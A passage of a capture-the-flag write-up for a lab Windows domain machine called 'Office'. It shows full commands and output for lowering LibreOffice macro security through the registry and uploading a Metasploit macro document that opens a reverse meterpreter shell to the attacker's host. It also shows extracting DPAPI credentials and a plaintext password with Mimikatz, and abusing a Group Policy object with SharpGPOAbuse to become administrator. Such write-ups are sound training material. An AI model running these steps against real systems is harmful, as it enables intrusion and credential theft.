+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         1/22/2024   9:58 AM                Common Files
+d-----         1/25/2024  12:20 PM                Internet Explorer
+d-----         1/17/2024   1:26 PM                LibreOffice 5
+d-----          5/2/2023   5:22 PM                Microsoft OneDrive
+d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
+d-----         4/14/2023   3:22 PM                Npcap
+d-----         4/12/2023   4:30 PM                Oracle
+d-----         2/14/2024   2:18 AM                VMware
+d-----         4/17/2023   3:35 PM                Windows Defender
+d-----         1/25/2024  12:20 PM                Windows Defender Advanced Threat Protection
+d-----         1/25/2024  12:20 PM                Windows Mail
+d-----         1/25/2024  12:20 PM                Windows Media Player
+d-----          5/8/2021   2:35 AM                Windows NT
+d-----          3/2/2022   7:58 PM                Windows Photo Viewer
+d-----          5/8/2021   1:34 AM                WindowsPowerShell
+d-----         4/14/2023   3:23 PM                Wireshark</code></pre>
+</doc-codeblock></div>
+<p>Older versions of <code v-pre>LibreOffice</code> usually have vulnerabilities that allow for code execution if a user opens a malicious document. To find the exact version we can execute the following command.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\Users\tstark\Desktop$ wmic product get name
+Name
+Office 16 Click-to-Run Extensibility Component
+Office 16 Click-to-Run Licensing Component
+Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31332
+Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31332
+LibreOffice 5.2.6.2
+DefaultPackMSI
+VMware Tools
+Teams Machine-Wide Installer
+Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30133
+Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30133
+Microsoft Search in Bing</code></pre>
+</doc-codeblock></div>
+<p>Looking further we also find an internal website. Quickly looking at the source code seems like we can upload a resume, but we cannot find this to be a public facing website.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\xampp\htdocs\internal$ ls
+Directory: C:\xampp\htdocs\internal
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2/14/2024   5:35 PM                applications
+d-----          5/1/2023   4:27 PM                css
+d-----          5/1/2023   4:27 PM                img
+-a----         1/30/2024   8:38 AM           5113 index.html
+-a----         1/30/2024   8:40 AM           5282 resume.php</code></pre>
+</doc-codeblock></div>
+<p>After looking a bit further, we can find a virtual host configuration in <code v-pre>C:\xampp\apache\conf\httpd.conf</code>. It looks like the internal website is running on port <code v-pre>8083</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">#Listen 12.34.56.78:80
+Listen 80
+Listen 8083
+
+&lt;VirtualHost *:8083&gt;
+    DocumentRoot &quot;C:\xampp\htdocs\internal&quot;
+    ServerName localhost:8083
+
+    &lt;Directory &quot;C:\xampp\htdocs\internal&quot;&gt;
+        Options -Indexes +FollowSymLinks +MultiViews
+        AllowOverride All
+        Require all granted
+    &lt;/Directory&gt;
+
+    ErrorLog &quot;logs/myweb-error.log&quot;
+    CustomLog &quot;logs/myweb-access.log&quot; combined
+&lt;/VirtualHost&gt;</code></pre>
+</doc-codeblock></div>
+<p>We can try to access the internal website by uploading a <a href="https://github.com/jpillora/chisel">Chisel</a> agent on the host.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">(local) pwncat$ upload /home/s3rp3nt/Tools/Windows/chisel_1.9.1_windows_amd64 c.exe
+(remote) tstark@DC:C:\Users\tstark$ .\c.exe client 10.10.14.7:8000 R:8083:127.0.0.1:8083
+
+$ ./chisel_1.9.1_linux_amd64 server --port 8000 --reverse</code></pre>
+</doc-codeblock></div>
+<p>We can now access the internal website by browsing to <code v-pre>http://127.0.0.1:8083</code> and we also find the page where we can upload a resume.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/office/resume-upload.png" alt="Web form resume upload">
+    <figcaption class="caption">Web form resume upload</figcaption>
+</figure>
+</p>
+<p>Looking back at the source code, we are only allowed to upload Word documents that are smaller than 5Mb in size. When trying to create a <code v-pre>.odt</code> document with a Macro, we can&#x27;t actually execute it on the machine. This means that there might be some extra protections in place.</p>
+<doc-anchor-target id="reduce-macro-security">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reduce-macro-security">#</doc-anchor-trigger>
+        <span>Reduce Macro Security</span>
+    </h3>
+</doc-anchor-target>
+<p>According to the <a href="https://wiki.documentfoundation.org/Deployment_and_Migration#Windows_Registry">LibreOffice Wikipedia</a>, there are registry values that can be used to control the
+security of the application. We can search for the <code v-pre>MacroSecurityLevel</code> registry key that shows the current settings.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\$ Get-ItemProperty -Path &quot;HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel&quot;
+Value        : 3
+Final        : 1
+PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
+               ce.Common\Security\Scripting\MacroSecurityLevel
+PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
+               ce.Common\Security\Scripting
+PSChildName  : MacroSecurityLevel
+PSDrive      : HKLM
+PSProvider   : Microsoft.PowerShell.Core\Registry</code></pre>
+</doc-codeblock></div>
+<p>The value is set to <code v-pre>3</code>, which means it&#x27;s set to High Security level. We need to find a way to change this value to allow our macros to trigger. The ACLs on this key show that the <code v-pre>Registry Editors</code> group has <code v-pre>FullControl</code> and lucky for us we are also part of this group.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\$ $key = &quot;HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting&quot;
+(remote) tstark@DC:C:\$ (Get-Acl $key).Access
+RegistryRights    : FullControl
+AccessControlType : Allow
+IdentityReference : OFFICE\Registry Editors
+IsInherited       : True
+InheritanceFlags  : ContainerInherit
+PropagationFlags  : None
+
+(remote) tstark@DC:C:\$ whoami /groups
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+OFFICE\Registry Editors                    Group            S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</code></pre>
+</doc-codeblock></div>
+<p>So we are able to update the <code v-pre>MacroSecurityLevel</code> key.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\$ Set-ItemProperty -Path &quot;$key\MacroSecurityLevel&quot; -Name &quot;Value&quot; -Value 0</code></pre>
+</doc-codeblock></div>
+<p>We can now create a document with a malicious macro with MetaSploit.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">msf6 &gt; use exploit/multi/misc/openoffice_document_macro
+msf6 exploit(multi/misc/openoffice_document_macro) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/misc/openoffice_document_macro) &gt; set LHOST 10.10.14.7
+msf6 exploit(multi/misc/openoffice_document_macro) &gt; run
+[*] Started reverse TCP handler on 10.10.14.7:4444
+[*] Using URL: http://10.10.14.7:8080/PvPe6N5kOKQ
+[*] Server started.
+[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
+[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Basic
+[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Basic/Standard
+[*] Packaging file: Basic/Standard/Module1.xml
+[*] Packaging file: Basic/Standard/script-lb.xml
+[*] Packaging file: Basic/script-lc.xml
+[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Configurations2
+[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Configurations2/accelerator
+[*] Packaging file: Configurations2/accelerator/current.xml
+[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/META-INF
+[*] Packaging file: META-INF/manifest.xml
+[*] Packaging directory: /opt/metasploit/data/exploits/openoffice_document_macro/Thumbnails
+[*] Packaging file: Thumbnails/thumbnail.png
+[*] Packaging file: content.xml
+[*] Packaging file: manifest.rdf
+[*] Packaging file: meta.xml
+[*] Packaging file: mimetype
+[*] Packaging file: settings.xml
+[*] Packaging file: styles.xml
+[+] msf.odt stored at /home/s3rp3nt/.msf4/local/msf.odt</code></pre>
+</doc-codeblock></div>
+<p>Next we upload the generated file to the server and wait for the macro to get executed. This may take a minute or two.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">[*] 10.10.11.3       openoffice_document_macro - Sending payload
+[*] Sending stage (201798 bytes) to 10.10.11.3
+[*] Meterpreter session 1 opened (10.10.14.7:4444 -&gt; 10.10.11.3:64661) at 2024-07-16 15:02:50 +0200
+msf6 exploit(multi/misc/openoffice_document_macro) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information         Connection
+  --  ----  ----                     -----------         ----------
+  1         meterpreter x64/windows  OFFICE\ppotts @ DC  10.10.14.7:4444 -&gt; 10.10.11.3:64661 (10.10.11.3)
+
+msf6 exploit(multi/misc/openoffice_document_macro) &gt; sessions 1
+meterpreter &gt; getuid
+Server username: OFFICE\ppotts</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="access-as-hhogan">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#access-as-hhogan">#</doc-anchor-trigger>
+        <span>Access as HHogan</span>
+    </h3>
+</doc-anchor-target>
+<p>After getting a shell as the user <code v-pre>ppotts</code> we can start to do some pillaging and look for any saved credentials on the current account. Executing <code v-pre>cmdkey /list</code> reveals there is also a saved credential for the user <code v-pre>HHogan</code>. Looking at the privileges of this user, we see that this account is part of the <code v-pre>Remote Management Users</code> group.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\PPotts&gt; cmdkey /list
+Currently stored credentials:
+
+    Target: LegacyGeneric:target=MyTarget
+    Type: Generic 
+    User: MyUser
+    
+    Target: Domain:interactive=office\hhogan
+    Type: Domain Password
+    User: office\hhogan
+
+PS C:\Users\PPotts&gt; net user hhogan
+User name                    HHogan
+Full Name 
+&lt;SNIP&gt;
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers </code></pre>
+</doc-codeblock></div>
+<p>This means that if we are able to recover the credentials of this account, we can most likely connect over WinRM. To get these credentials we can use DPAPI. The DPAPI credential files are decrypted using the user&#x27;s password, and can be decrypted with the master key or the domain key in case we have access as a domain administrator.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Credentials
+Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
+-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
+-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="root">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
+        <span>Root</span>
+    </h2>
+</doc-anchor-target>
+<p>We see three protected files and to be able to extract any data from them we need the master key.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Protect
+Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
+-a-hs-          5/2/2023   4:13 PM             24 CREDHIST
+-a-hs-         1/17/2024   4:06 PM             76 SYNCHIST
+
+PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
+Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
+-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
+-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE
+-a-hs-         7/16/2024  12:59 PM            740 dd51073f-efb9-463b-a892-31cfafe2feb4
+-a-hs-         7/16/2024  12:59 PM             24 Preferred</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="mimikatz-credential-extraction">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#mimikatz-credential-extraction">#</doc-anchor-trigger>
+        <span>Mimikatz Credential Extraction</span>
+    </h3>
+</doc-anchor-target>
+<p>In order to get the secret out of these blobs we would normally need to know the user&#x27;s password. However, since we are logged in we can query the Domain Controller to retrieve the secrets for us. Since we own the
+master credentials associated with our own account, we can abuse this component by using the <code v-pre>/rpc</code> flag in Mimikatz. We will first upload a copy of <code v-pre>mimikatz.exe</code> and run it to extract the master key.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\Public&gt; .\mimikatz.exe &quot;dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc&quot; &quot;exit&quot;
+
+ .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
+
+&lt;SNIP&gt;
+
+[domainkey] with RPC
+[DC] 'office.htb' will be the domain
+[DC] 'DC.office.htb' will be the DC server
+  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
+
+mimikatz(commandline) # exit
+Bye!</code></pre>
+</doc-codeblock></div>
+<p>The second blob is the correct one (oldest date) and we can find the master key at the bottom. We can then decrypt the blobs using this master key and find a password in the second credential blob.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\Public&gt; .\mimikatz.exe &quot;dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166&quot; &quot;exit&quot;
+
+&lt;SNIP&gt;
+
+Decrypting Credential:
+ * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000be - 190
+  credUnk0       : 00000000 - 0
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 5/9/2023 11:03:21 PM
+  unkFlagsOrSize : 00000018 - 24
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:interactive=OFFICE\HHogan
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : OFFICE\HHogan
+  CredentialBlob : H4ppyFtW183#
+  Attributes     : 0
+
+mimikatz(commandline) # exit
+Bye!</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="gpo-abuse">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#gpo-abuse">#</doc-anchor-trigger>
+        <span>GPO Abuse</span>
+    </h3>
+</doc-anchor-target>
+<p>With the found DPAPI credentials we can now get a WinRM session with the user <code v-pre>HHogan</code>. This user is a member of the <code v-pre>GPO Managers</code> group and there are a few GPOs in the domain.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
+*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; Get-GPO -All | Select-Object DisplayName
+
+DisplayName
+-----------
+Windows Firewall GPO
+Default Domain Policy
+Default Active Directory Settings GPO
+Default Domain Controllers Policy
+Windows Update GPO
+Windows Update Domain Policy
+Software Installation GPO
+Password Policy GPO</code></pre>
+</doc-codeblock></div>
+<p>We can assume that this user can edit GPOs (this can be confirmed by running BloodHound). GPOs, or Group Policy Objects, are policies that Windows uses to manage computers at scale. We can use a tool <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a> in order to create a Policy that adds us as a local admin.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Programdata&gt; .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName &quot;Windows Firewall GPO&quot;
+[+] Domain = office.htb
+[+] Domain Controller = DC.office.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
+[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
+[+] GUID of &quot;Windows Firewall GPO&quot; is: {04FE5C75-0078-4D44-97C5-8A796BE906EC}
+Access to the path '\\office.htb\SysVol\office.htb\Policies\{04FE5C75-0078-4D44-97C5-8A796BE906EC}\Machine\Microsoft\Windows NT\SecEdit\' is denied.[!] 
+Exiting...</code></pre>
+</doc-codeblock></div>
+<p>The first policy fails, so lets try to use the second one.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Programdata&gt; .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName &quot;Default Domain Policy&quot;
+[+] Domain = office.htb
+[+] Domain Controller = DC.office.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
+[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
+[+] GUID of &quot;Default Domain Policy&quot; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO does not specify any group memberships.
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!</code></pre>
+</doc-codeblock></div>
+<p>This doesn’t take effect until the GPO refreshes, but we are allowed to run <code v-pre>gpupdate /force</code>. Afterwards we need to exit our current WinRM session and authenticate again for the changes to take effect. We can then see ourselves in the <code v-pre>BUILTIN\Administrators</code> group and can access the Administrator desktop.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+Directory: C:\Users\Administrator\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         7/16/2024  12:58 PM             34 root.txt</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Office (Hard)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
